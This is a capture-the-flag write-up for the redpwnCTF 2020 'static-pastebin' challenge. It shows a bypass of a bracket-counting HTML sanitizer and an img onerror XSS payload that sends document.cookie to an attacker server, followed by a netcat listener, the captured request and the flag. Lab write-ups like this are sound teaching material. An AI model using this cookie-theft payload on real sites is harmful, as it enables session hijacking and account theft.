<h1>static-pastebin</h1>

<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>

<p>This challenge uses XSS to get the flag from the <code>admin bot's</code> cookies.</p>

<h1>Requirements</h1>

<ul>
<li>Basic Knowledge of XSS.</li>
<li>A web server where you can accept a request.</li>
</ul>

<h1>Source</h1>

<ul>
<li>https://static-pastebin.2020.redpwnc.tf/</li>
</ul>

<h1>Exploitation</h1>

<p>First, try a random <code>&lt;h1&gt;Hello&lt;/h1&gt;</code> tag to see if you can put HTML in your pastebin. You can see the <code>js</code> file in the page:</p>

<p>```javascript
(async () =&gt; {
    await new Promise((resolve) =&gt; {
        window.addEventListener('load', resolve);
    });</p>

<pre><code>const content = window.location.hash.substring(1);
display(atob(content));
</code></pre>

<p>})();</p>

<p>function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}</p>

<p>function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i &lt; input.length; i++) {
        const current = input.charAt(i);
        if (current == '&lt;') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```</p>

<p>We can infer 2 things from this.</p>

<ul>
<li>The content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.</li>
<li>The <code>clean</code> function will not allow writing of text if bracket pairs do not match.</li>
</ul>

<p>It is rather easy to break this clean function, by adding an extra <code>&gt;</code> at the starting of your XSS script. Here's the payload:</p>

<p>```</p>

<blockquote>
  <p><img src=1 href=1 onerror="javascript:document.location='http://ip:port?cookie='+document.cookie"></img>
  ```</p>
</blockquote>

<p>Your payload has the following URL:</p>

<p><code>
https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9pcDpwb3J0P2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pbWc+
</code></p>

<p>You can simply set up a <code>netcat listener</code> using <code>nc -l port</code> on your server, and pass the link to the <code>Admin Bot</code> <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin&url=https%3A%2F%2Fstatic-pastebin.2020.redpwnc.tf%2Fpaste%2F%23PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9jc2l2aXQuY29tOjkwMDE%2FY29va2llPScrZG9jdW1lbnQuY29va2llIj48L2ltZz4%3D&message=The%20admin%20has%20visited%20your%20URL.">here</a>. The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:</p>

<p><code>
GET /?cookie=flag=flag{54n1t1z4t10n_k1nd4_h4rd} HTTP/1.1
Host: ip:port
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
</code></p>

<p>The flag is:</p>

<p><code>
flag{54n1t1z4t10n_k1nd4_h4rd}
</code></p>
